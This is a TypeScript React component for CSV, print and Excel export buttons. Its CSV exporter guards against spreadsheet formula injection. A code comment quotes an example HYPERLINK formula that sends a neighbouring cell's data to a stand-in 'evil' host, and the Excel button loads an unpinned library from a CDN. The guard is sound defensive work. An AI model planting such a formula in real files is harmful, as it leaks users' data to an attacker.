"use client";
import { Download } from "lucide-react";
export function ExportButton({ rows, filename, columns }: { rows: any[]; filename: string; columns?: string[] }) {
  function exportCsv() {
    if (!rows?.length) { alert("No data to export yet."); return; }
    const cols = columns || Object.keys(rows[0]);
    /*
      TWO THINGS, NOT ONE. The quoting below is RFC-4180 and was already
      right. What was missing is the formula guard.

      A cell whose first character is = + - @ (or a tab/CR, which some
      spreadsheets strip before parsing) is executed as a FORMULA by Excel,
      LibreOffice and Google Sheets when the file is opened. The round trip is
      real in this product and not hypothetical: lib/import-map.ts stores text
      columns — party, customer_name, supplier, product, sku — as bare
      String(v) from an uploaded CSV, a Google Sheets URL or /api/v1/ingest,
      and those same tables are what this button exports. So a supplier can
      choose the contents of a cell that later opens on the owner's machine,
      and `=HYPERLINK("https://evil/?d="&A1,"Invoice")` exfiltrates the row
      next to it on one click.

      Prefixing a single quote is the conventional neutraliser: the character
      is consumed by the spreadsheet as "treat the rest as text" and does not
      appear in the cell. The value is unchanged for every cell that does not
      start with one of these characters, including every number, because
      negative numbers arrive here as "-123" — which is why the guard must
      come after a numeric check, or it would quote-prefix real figures.
    */
    const RISKY = /^[=+\-@\t\r]/;
    const esc = (v: any) => {
      const s = String(v ?? "");
      const isNumber = s !== "" && Number.isFinite(Number(s));
      const safe = RISKY.test(s) && !isNumber ? `'${s}` : s;
      return `"${safe.replace(/"/g, '""')}"`;
    };
    const csv = [cols.join(","), ...rows.map((r) => cols.map((c) => esc(r[c])).join(","))].join("\n");
    const blob = new Blob([csv], { type: "text/csv" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url; a.download = filename; a.click();
    URL.revokeObjectURL(url);
  }
  return (
    <button onClick={exportCsv} className="inline-flex items-center gap-2 rounded-lg border h-9 px-3 text-sm hover:bg-accent">
      <Download className="h-4 w-4" /> Export CSV
    </button>
  );
}

export function PrintButton() {
  return (
    <button onClick={() => window.print()} className="inline-flex items-center gap-2 rounded-lg border h-9 px-3 text-sm hover:bg-accent">
      Print / PDF
    </button>
  );
}

export function ExcelButton({ rows, filename, columns }: { rows: any[]; filename: string; columns?: string[] }) {
  async function exp() {
    if (!rows?.length) { alert("No data to export yet."); return; }
    try {
      await new Promise<void>((res, rej) => {
        const src = "https://cdn.sheetjs.com/xlsx-latest/package/dist/xlsx.full.min.js";
        if ((window as any).XLSX) return res();
        if ([...document.scripts].some((sc) => sc.src === src)) return res();
        const el = document.createElement("script"); el.src = src; el.onload = () => res(); el.onerror = () => rej(); document.head.appendChild(el);
      });
      const XLSX: any = (window as any).XLSX;
      const cols = columns || Object.keys(rows[0]);
      const data = rows.map((r) => Object.fromEntries(cols.map((c) => [c, r[c]])));
      const ws = XLSX.utils.json_to_sheet(data);
      const wb = XLSX.utils.book_new();
      XLSX.utils.book_append_sheet(wb, ws, "Data");
      XLSX.writeFile(wb, filename.replace(/\.csv$/, "") + ".xlsx");
    } catch { alert("Excel export failed — CSV still works."); }
  }
  return (
    <button onClick={exp} className="inline-flex items-center gap-2 rounded-lg border h-9 px-3 text-sm hover:bg-accent">
      <Download className="h-4 w-4" /> Excel
    </button>
  );
}
